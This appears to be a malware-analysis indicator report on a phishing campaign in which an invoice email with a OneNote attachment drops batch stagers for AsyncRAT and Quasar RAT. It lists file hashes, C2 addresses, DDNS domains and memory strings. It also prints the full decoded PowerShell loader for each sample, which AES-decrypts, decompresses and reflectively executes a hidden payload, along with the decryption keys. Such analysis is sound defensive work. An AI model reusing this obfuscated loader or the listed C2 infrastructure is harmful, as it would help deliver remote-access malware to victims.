THREAT IDENTIFICATION:  ASYNCRAT AND QUASAR RAT

SUBJECTS OBSERVED
Invoice #Q0092871

SENDERS OBSERVED
payment@cawinprintllc.com

ATTACHED ONENOTE FILE HASH
Invoice #Q0092871.one
3a08c76bcdaf1ec5e6e5c5cf86200a17

EMBEDDED BAT FILE HASH
now.bat
acc0319bd3a42bc8218eb28dc7df1ee0

DECODED POWERSHELL FROM BATCH FILE
C:\Users\analyst\Documents\samples > echo "now.bat.exe"  - noprofile  - windowstyle hidden  - ep bypass  - command $poYkW = [System.IO.File]::('txeTllAdaeR'[ - 1.. - 11]  - join '')('C:\Users\analyst\Documents\samples\now.bat').Split([Environment]::NewLine);
foreach ($MtkqC in $poYkW) {
    if ($MtkqC.StartsWith(':: '))  {
        $KzMFL = $MtkqC.Substring(3);
        break;
    };
};
$euhBh = [System.Convert]::('gnirtS46esaBmorF'[ - 1.. - 16]  - join '')($KzMFL);
$nXvfj = New - Object System.Security.Cryptography.AesManaged;
$nXvfj.Mode = [System.Security.Cryptography.CipherMode]::CBC;
$nXvfj.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7;
$nXvfj.Key = [System.Convert]::('gnirtS46esaBmorF'[ - 1.. - 16]  - join '')('UYiNLjhHT9td7UJ8WrXL9A+yhtpxWIAjaq1prTyoaZA=');
$nXvfj.IV = [System.Convert]::('gnirtS46esaBmorF'[ - 1.. - 16]  - join '')('LuTVahH/f4OD9KECD6pFwg==');
$kijoL = $nXvfj.CreateDecryptor();
$euhBh = $kijoL.TransformFinalBlock($euhBh, 0, $euhBh.Length);
$kijoL.Dispose();
$nXvfj.Dispose();
$izCgX = New - Object System.IO.MemoryStream(, $euhBh);
$nCnJO = New - Object System.IO.MemoryStream;
$qcUSr = New - Object System.IO.Compression.GZipStream($izCgX, [IO.Compression.CompressionMode]::Decompress);
$qcUSr.CopyTo($nCnJO);
$qcUSr.Dispose();
$izCgX.Dispose();
$nCnJO.Dispose();
$euhBh = $nCnJO.ToArray();
$KnYPD = [System.Reflection.Assembly]::('daoL'[ - 1.. - 4]  - join '')($euhBh);
$eiVHi = $KnYPD.EntryPoint;
$eiVHi.Invoke($null, (, [string[]] (''))) 
"now.bat.exe"  - noprofile  - windowstyle hidden  - ep bypass  - command $poYkW = [System.IO.File]::('txeTllAdaeR'[ - 1.. - 11]  - join '')('C:\Users\analyst\Documents\samples\now.bat').Split([Environment]::NewLine);
foreach ($MtkqC in $poYkW) {
    if ($MtkqC.StartsWith(':: '))  {
        $KzMFL = $MtkqC.Substring(3);
        break;
    };
};
$euhBh = [System.Convert]::('gnirtS46esaBmorF'[ - 1.. - 16]  - join '')($KzMFL);
$nXvfj = New - Object System.Security.Cryptography.AesManaged;
$nXvfj.Mode = [System.Security.Cryptography.CipherMode]::CBC;
$nXvfj.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7;
$nXvfj.Key = [System.Convert]::('gnirtS46esaBmorF'[ - 1.. - 16]  - join '')('UYiNLjhHT9td7UJ8WrXL9A+yhtpxWIAjaq1prTyoaZA=');
$nXvfj.IV = [System.Convert]::('gnirtS46esaBmorF'[ - 1.. - 16]  - join '')('LuTVahH/f4OD9KECD6pFwg==');
$kijoL = $nXvfj.CreateDecryptor();
$euhBh = $kijoL.TransformFinalBlock($euhBh, 0, $euhBh.Length);
$kijoL.Dispose();
$nXvfj.Dispose();
$izCgX = New - Object System.IO.MemoryStream(, $euhBh);
$nCnJO = New - Object System.IO.MemoryStream;
$qcUSr = New - Object System.IO.Compression.GZipStream($izCgX, [IO.Compression.CompressionMode]::Decompress);
$qcUSr.CopyTo($nCnJO);
$qcUSr.Dispose();
$izCgX.Dispose();
$nCnJO.Dispose();
$euhBh = $nCnJO.ToArray();
$KnYPD = [System.Reflection.Assembly]::('daoL'[ - 1.. - 4]  - join '')($euhBh);
$eiVHi = $KnYPD.EntryPoint;
$eiVHi.Invoke($null, (, [string[]] ('')))

AES DECRYPTION KEYS USED TO EXTRACT THE PAYLOAD
These 2 base64 blobs are used to decrypt the payload:

Key:
UYiNLjhHT9td7UJ8WrXL9A+yhtpxWIAjaq1prTyoaZA=

IV:
LuTVahH/f4OD9KECD6pFwg==

CYBERCHEF RECIPE TO DECRYPT PAYLOAD
From_Base64('A-Za-z0-9+/=',true,false)
AES_Decrypt({'option':'Base64','string':'UYiNLjhHT9td7UJ8WrXL9A+yhtpxWIAjaq1prTyoaZA='},{'option':'Base64','string':'LuTVahH/f4OD9KECD6pFwg=='},'CBC','Raw','Raw',{'option':'Hex','string':''},{'option':'Hex','string':''})
Gunzip()

EXTRACTED ASYNCRAT PAYLOAD FILE HASH
extracted.exe
b7ea77c641e89df782886c77c2683fb1

LIKELY ASYNCRAT C2
89.117.21.143

ASYNCRAT MUTEX FROM MEMORY
Mutant, \Sessions\1\BaseNamedObjects\AsyncMutex_6SI8OkPnk, 0x3d8


SECOND PAYLOAD - QUASAR RAT IOCS
================================
STAGER BATCH FILE HASH
feshir.bat
95cf5388dc33094e534967faf07f778d

DECODED POWERSHELL FROM BATCH FILE
copy C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe  / y "feshir_defanged.bat.exe"
cd "C:\Users\analyst\Documents\samples\"
"feshir_defanged.bat.exe"  - noprofile  - windowstyle hidden  - ep bypass  - command $rLCTd = [System.IO.File]::('txeTllAdaeR'[ - 1.. - 11]  - join '')('C:\Users\analyst\Documents\samples\feshir_defanged.bat').Split([Environment]::NewLine);
foreach ($HBXTg in $rLCTd) {
    if ($HBXTg.StartsWith(':: '))  {
        $RfKRs = $HBXTg.Substring(3);
        break;
    };
};
$fGskC = [System.Convert]::('gnirtS46esaBmorF'[ - 1.. - 16]  - join '')($RfKRs);
$MtuCv = New - Object System.Security.Cryptography.AesManaged;
$MtuCv.Mode = [System.Security.Cryptography.CipherMode]::CBC;
$MtuCv.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7;
$MtuCv.Key = [System.Convert]::('gnirtS46esaBmorF'[ - 1.. - 16]  - join '')('9+w88nJFnHZCcFhcijqxur/nvGIbHq884K/OSd08hVY=');
$MtuCv.IV = [System.Convert]::('gnirtS46esaBmorF'[ - 1.. - 16]  - join '')('xuWE8knMCtTB/A6CDaewnw==');
$LfoKM = $MtuCv.CreateDecryptor();
$fGskC = $LfoKM.TransformFinalBlock($fGskC, 0, $fGskC.Length);
$LfoKM.Dispose();
$MtuCv.Dispose();
$dqsGF = New - Object System.IO.MemoryStream(, $fGskC);
$caOgI = New - Object System.IO.MemoryStream;
$eizez = New - Object System.IO.Compression.GZipStream($dqsGF, [IO.Compression.CompressionMode]::Decompress);
$eizez.CopyTo($caOgI);
$eizez.Dispose();
$dqsGF.Dispose();
$caOgI.Dispose();
$fGskC = $caOgI.ToArray();
$jaoZN = [System.Reflection.Assembly]::('daoL'[ - 1.. - 4]  - join '')($fGskC);
$ntauE = $jaoZN.EntryPoint;
$ntauE.Invoke($null, (, [string[]] ('')))

QUASAR RAT PAYLOAD FILE HASH
feshir.bat.exe
04029e121a0cfa5991749937dd22a1d9

QUASAR C2
154.12.234.207:4782

ADDITIONAL OBSERVED NETWORK TRAFFIC
DNS Query for:
quasharr.ddns.net

http://api4.ipify.org

STRINGS FOM MEMORY
Quasar Server CA0 

quasharr.ddns.net
quasharr21.ddns.net
quasharr22.ddns.net
quasharr33.ddns.net

Quasar.Common.Messages.ClientIdentificationResult
Quasar.Common.Messages.DoChangeRegistryValue
Quasar.Common.Messages.DoCloseConnection
Quasar.Common.Messages.DoCreateRegistryKey
Quasar.Common.Messages.DoCreateRegistryValue
Quasar.Common.Messages.DoDeleteRegistryValue
Quasar.Common.Messages.DoLoadRegistryKey
Quasar.Common.Messages.DoMouseEvent
Quasar.Common.Messages.DoPathDelete
Quasar.Common.Messages.DoProcessEnd
Quasar.Common.Messages.DoShellExecute
Quasar.Common.Messages.DoShellExecuteResponse
Quasar.Common.Messages.DoShowMessageBox
Quasar.Common.Messages.DoShutdownAction
Quasar.Common.Messages.DoStartupItemAdd
Quasar.Common.Messages.DoStartupItemRemove
Quasar.Common.Messages.DoVisitWebsite
Quasar.Common.Messages.FileTransferCancel
Quasar Client





